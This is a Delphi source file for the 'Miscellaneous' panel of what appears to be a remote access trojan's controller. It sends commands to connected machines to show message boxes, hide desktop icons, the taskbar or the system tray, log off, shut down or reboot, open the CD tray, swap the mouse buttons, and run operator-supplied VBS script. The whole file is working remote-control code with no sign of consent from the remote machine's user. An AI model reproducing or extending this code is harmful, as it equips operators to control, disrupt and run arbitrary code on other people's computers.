unit UnitMiscellaneous;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, sSpeedButton, ExtCtrls, ComCtrls, UnitConnection,
  IniFiles, IdTCPServer;

type
  TFormMiscellaneous = class(TForm)
    pgc1: TPageControl;
    ts1: TTabSheet;
    grp1: TGroupBox;
    edt1: TEdit;
    redt1: TRichEdit;
    grp2: TGroupBox;
    lv1: TListView;
    rg1: TRadioGroup;
    grpIcon: TGroupBox;
    img8: TImage;
    img7: TImage;
    img6: TImage;
    img5: TImage;
    btn1: TsSpeedButton;
    rb1: TRadioButton;
    rb2: TRadioButton;
    rb3: TRadioButton;
    rb4: TRadioButton;
    rb5: TRadioButton;
    btn2: TButton;
    btn3: TButton;
    ts2: TTabSheet;
    grp4: TGroupBox;
    btn4: TButton;
    btn6: TButton;
    btn8: TButton;
    grp5: TGroupBox;
    btn10: TButton;
    btn11: TButton;
    btn12: TButton;
    grp6: TGroupBox;
    btn13: TButton;
    grp3: TGroupBox;
    btn5: TButton;
    grp7: TGroupBox;
    btn15: TButton;
    edt2: TEdit;
    procedure btn2Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn8Click(Sender: TObject);
    procedure btn10Click(Sender: TObject);
    procedure btn12Click(Sender: TObject);
    procedure btn11Click(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure btn15Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormMiscellaneous: TFormMiscellaneous;
  IconsState, TaskbarState, SystrayState, CdState: Integer;

implementation

uses
  UnitConstants, UnitFunctions;

{$R *.dfm}
     
constructor TFormMiscellaneous.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormMiscellaneous.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormMiscellaneous.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  TmpItem: TListItem;
  TmpStr: string;
begin
  lv1.Clear;
  lv1.Items.BeginUpdate;

  while ReceivedDatas <> '' do
  begin
    TmpItem := lv1.Items.Add;
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpItem.Caption := TmpStr;
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    Delete(ReceivedDatas, 1, 2);

    TmpItem.ImageIndex := 0;
  end;

  lv1.Items.EndUpdate;
end;

procedure TFormMiscellaneous.btn2Click(Sender: TObject);
begin
  if rb1.Checked then
  begin
    case rg1.ItemIndex of
      0: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONERROR + MB_OK);
      1: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONERROR + MB_OKCANCEL);
      2: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONERROR + MB_YESNO);
      3: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONERROR + MB_YESNOCANCEL);
      4: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONERROR + MB_RETRYCANCEL);
      5: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONERROR + MB_ABORTRETRYIGNORE);
    end;
  end;

  if rb2.Checked then
  begin
    case rg1.ItemIndex of
      0: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONWARNING + MB_OK);
      1: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONWARNING + MB_OKCANCEL);
      2: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICOnWARNING + MB_YESNO);
      3: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONWARNING + MB_YESNOCANCEL);
      4: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICOnWARNING + MB_RETRYCANCEL);
      5: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONWARNING + MB_ABORTRETRYIGNORE);
    end;
  end;

  if rb3.Checked then
  begin
    case rg1.ItemIndex of
      0: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONQUESTION + MB_OK);
      1: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONQUESTION + MB_OKCANCEL);
      2: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONQUESTION + MB_YESNO);
      3: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONQUESTION + MB_YESNOCANCEL);
      4: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONQUESTION + MB_RETRYCANCEL);
      5: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONQUESTION + MB_ABORTRETRYIGNORE);
    end;
  end;

  if rb4.Checked then
  begin
    case rg1.ItemIndex of
      0: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONINFORMATION + MB_OK);
      1: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONINFORMATION + MB_OKCANCEL);
      2: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONINFORMATION + MB_YESNO);
      3: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONINFORMATION + MB_YESNOCANCEL);
      4: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONINFORMATION + MB_RETRYCANCEL);
      5: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ICONINFORMATION + MB_ABORTRETRYIGNORE);
    end;
  end;

  if rb5.Checked then
  begin
    case rg1.ItemIndex of
      0: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_OK);
      1: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_OKCANCEL);
      2: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_YESNO);
      3: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_YESNOCANCEL);
      4: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_RETRYCANCEL);
      5: MessageBox(Handle, PChar(redt1.Text), PChar(edt1.Text), MB_ABORTRETRYIGNORE);
    end;
  end;
end;

procedure TFormMiscellaneous.btn3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lv1.Selected) then TmpStr := '0' else TmpStr := lv1.Selected.Caption;
  if rb1.Checked then
  begin
    case rg1.ItemIndex of
      0: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|0|' + '0');
      1: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|0|' + '1');
      2: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|0|' + '2');
      3: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|0|' + '3');
      4: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|0|' + '4');
      5: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|0|' + '5');
    end;
  end;

  if rb2.Checked then
  begin
    case rg1.ItemIndex of
      0: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|1|' + '0');
      1: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|1|' + '1');
      2: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|1|' + '2');
      3: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|1|' + '3');
      4: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|1|' + '4');
      5: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|1|' + '5');
    end;
  end;

  if rb3.Checked then
  begin
    case rg1.ItemIndex of
      0: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|2|' + '0');
      1: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|2|' + '1');
      2: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|2|' + '2');
      3: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|2|' + '3');
      4: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|2|' + '4');
      5: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|2|' + '5');
    end;
  end;

  if rb4.Checked then
  begin
    case rg1.ItemIndex of
      0: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|3|' + '0');
      1: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|3|' + '1');
      2: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|3|' + '2');
      3: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|3|' + '3');
      4: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|3|' + '4');
      5: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|3|' + '5');
    end;
  end;

  if rb5.Checked then
  begin
    case rg1.ItemIndex of
      0: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|4|' + '0');
      1: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|4|' + '1');
      2: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|4|' + '2');
      3: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|4|' + '3');
      4: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|4|' + '4');
      5: SendDatas(Client.AThread, MESSAGESBOX + '|' + TmpStr + '|' + PChar(redt1.Text) + '|' + PChar(edt1.Text) + '|4|' + '5');
    end;
  end;
end;

procedure TFormMiscellaneous.btn4Click(Sender: TObject);
begin
  case IconsState of
    0:  begin
          SendDatas(Client.AThread, DESKTOPHIDEICONS + '|');
          IconsState := 1;
        end;
    1:  begin
          SendDatas(Client.AThread, DESKTOPSHOWICONS + '|');
          IconsState := 0;
        end;
  end;
end;

procedure TFormMiscellaneous.btn6Click(Sender: TObject);
begin
  case TaskbarState of
    0:  begin
          SendDatas(Client.AThread, DESKTOPHIDETASKSBAR + '|');
          TaskbarState := 1;
        end;
    1:  begin
          SendDatas(Client.AThread, DESKTOPSHOWTASKSBAR + '|');
          TaskbarState := 0;
        end;
  end;
end;

procedure TFormMiscellaneous.btn8Click(Sender: TObject);
begin
  case SystrayState of
    0:  begin
          SendDatas(Client.AThread, DESKTOPHIDESYSTEMTRAY + '|');
          SystrayState := 1;
        end;
    1:  begin
          SendDatas(Client.AThread, DESKTOPSHOWSYSTEMTRAY + '|');
          SystrayState := 0;
        end;
  end;
end;

procedure TFormMiscellaneous.btn10Click(Sender: TObject);
begin
  SendDatas(Client.AThread, COMPUTERLOGOFF + '|');
end;

procedure TFormMiscellaneous.btn12Click(Sender: TObject);
begin
  SendDatas(Client.AThread, COMPUTERSHUTDWON + '|');
end;

procedure TFormMiscellaneous.btn11Click(Sender: TObject);
begin
  SendDatas(Client.AThread, COMPUTERREBOOT + '|');
end;

procedure TFormMiscellaneous.btn13Click(Sender: TObject);
begin
  case CdState of
    0:  begin
          SendDatas(Client.AThread, CDDRIVEOPEN + '|');
          CdState := 1;
        end;
    1:  begin
          SendDatas(Client.AThread, CDDRIVECLOSE + '|');
          CdState := 0;
        end;
  end;
end;

procedure TFormMiscellaneous.btn5Click(Sender: TObject);
begin
  SendDatas(Client.AThread, MOUSESWAPBUTTONS + '|');
end;

procedure TFormMiscellaneous.btn15Click(Sender: TObject);
begin
  if edt2.Text = '' then Exit;
  SendDatas(Client.AThread, SCRIPTVBS + '|' + edt2.Text);
end;

procedure TFormMiscellaneous.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Miscellaneous', 'Left', Left);
  IniFile.WriteInteger('Miscellaneous', 'Top', Top);
  IniFile.WriteInteger('Miscellaneous', 'Width', Width);
  IniFile.WriteInteger('Miscellaneous', 'Height', Height);
  IniFile.WriteInteger('Miscellaneous', 'Icons state', IconsState);
  IniFile.WriteInteger('Miscellaneous', 'Taskbar state', TaskbarState);
  IniFile.WriteInteger('Miscellaneous', 'Systray state', SystrayState);
  IniFile.WriteInteger('Miscellaneous', 'Cd state', CdState);
  IniFile.WriteString('Miscellaneous', 'Message title', edt1.Text);
  IniFile.WriteString('Miscellaneous', 'Message body', redt1.Text);
  IniFile.WriteBool('Miscellaneous', 'Message icon error', rb1.Checked);
  IniFile.WriteBool('Miscellaneous', 'Message icon warning', rb2.Checked);
  IniFile.WriteBool('Miscellaneous', 'Message icon question', rb3.Checked);
  IniFile.WriteBool('Miscellaneous', 'Message icon info', rb4.Checked);
  IniFile.WriteBool('Miscellaneous', 'Message icon none', rb5.Checked);
  IniFile.WriteInteger('Miscellaneous', 'Message button', rg1.ItemIndex);
  IniFile.WriteString('Miscellaneous', 'Text to speech', edt2.Text);
  IniFile.Free;
end;

procedure TFormMiscellaneous.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Miscellaneous', 'Left', 311);
  Top := IniFile.ReadInteger('Miscellaneous', 'Top', 116);
  Width := IniFile.ReadInteger('Miscellaneous', 'Width', 569);
  Height := IniFile.ReadInteger('Miscellaneous', 'Height', 379);
  IconsState := IniFile.ReadInteger('Miscellaneous', 'Icons state', 0);
  TaskbarState := IniFile.ReadInteger('Miscellaneous', 'Taskbar state', 0);
  SystrayState := IniFile.ReadInteger('Miscellaneous', 'Systray state', 0);
  CdState := IniFile.ReadInteger('Miscellaneous', 'Cd state', 1);
  edt1.Text := IniFile.ReadString('Miscellaneous', 'Message title',
    PROGRAMNAME + ' ' + PROGRAMVERSION);
  redt1.Text := IniFile.ReadString('Miscellaneous', 'Message body',
    PROGRAMNAME + ' ' + PROGRAMVERSION + #13#10 + 'Coded by ' + PROGRAMAUTHOR);
  rb1.Checked := IniFile.ReadBool('Miscellaneous', 'Message icon error', False);
  rb2.Checked := IniFile.ReadBool('Miscellaneous', 'Message icon warning', False);
  rb3.Checked := IniFile.ReadBool('Miscellaneous', 'Message icon question', False);
  rb4.Checked := IniFile.ReadBool('Miscellaneous', 'Message icon info', True);
  rb5.Checked := IniFile.ReadBool('Miscellaneous', 'Message icon none', False);
  rg1.ItemIndex := IniFile.ReadInteger('Miscellaneous', 'Message button', 0);
  edt2.Text := IniFile.ReadString('Miscellaneous', 'Text to speech',
    PROGRAMNAME + ' ' + PROGRAMVERSION + #13#10 + 'Coded by ' + PROGRAMAUTHOR);
  IniFile.Free;
end;

procedure TFormMiscellaneous.FormShow(Sender: TObject);
begin
  SendDatas(Client.AThread, WINDOWSLISTMESSAGESBOX + '|');
end;

end.
